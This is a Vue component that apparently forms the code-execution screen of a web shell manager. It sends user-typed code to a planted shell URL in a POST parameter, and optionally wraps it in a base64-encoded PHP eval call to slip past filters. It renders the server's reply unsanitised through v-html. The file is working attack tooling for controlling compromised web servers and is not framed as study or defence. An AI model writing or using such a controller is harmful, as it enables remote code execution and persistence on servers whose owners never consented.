<template>
    <div class="content"
         ref="content">
        <c-header>
        </c-header>
        <c-button style="float: right; margin:0 20px;" @click="send">发送</c-button>
        <c-button style="float: right; margin:0 20px;" @click="sendBase64">Base64发送</c-button>

        <textarea name="" id="" cols="30" rows="10" v-model="code"/>
        <div class="html" v-html="res"></div>
    </div>
</template>

<script>
    import crypto from '../../utils/crypto'

    export default {
        name: 'codeExec',
        data() {
            return {
                code: '',
                shell: null,
                res: null
            }
        },
        created() {
            this.shell = JSON.parse(this.$route.query.shell)
        },
        methods: {
            async send() {
                let res = await this.$request(this.shell.url, {c: this.code}, {}, 'post')
                //console.log(res)
                this.res = res
            },
            async sendBase64() {
                let base64Str = crypto.base64Encode(this.code)
                console.log(base64Str)
                // base64Str = encodeURIComponent(base64Str)
                let res = await this.$request(this.shell.url, {
                    c: `@eval(@base64_decode('${base64Str}'));`
                }, {}, 'post')
                //console.log(res)
                this.res = res
            },
        }
    }
</script>

<style lang="less" scoped>
    @import "../../assets/less/color";

    .content {
        overflow: auto;
        height: 100%;
        background: @main-bg-color;
        font-size: 18px;

        textarea {
            font-size: 18px;
            padding: 20px;
            width: 100%;
            background: @main-bg-color;
            height: 30%;
            color: white;
        }

        .html {
            background: white;
        }
    }

</style>
